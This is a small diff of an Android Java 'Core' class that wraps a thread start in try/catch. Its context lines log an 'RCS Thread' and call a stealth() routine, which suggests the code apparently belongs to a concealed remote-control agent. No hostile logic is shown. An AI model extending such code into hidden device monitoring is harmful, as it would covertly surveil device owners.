@@ -72,7 +72,12 @@ public class Core extends Activity implements Runnable {
 
 		Check.asserts(resources != null, "Null Resources");
 
-		coreThread.start();
+		try {
+			coreThread.start();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		
 		return true;
 	}
 
@@ -98,6 +103,7 @@ public class Core extends Activity implements Runnable {
 		Log.d("QZ", TAG + " RCS Thread Started");
 
 		stealth();
+		
 		try {
 			while (!bStopCore) {
 				Log.d("QZ", TAG + " Info: init task");
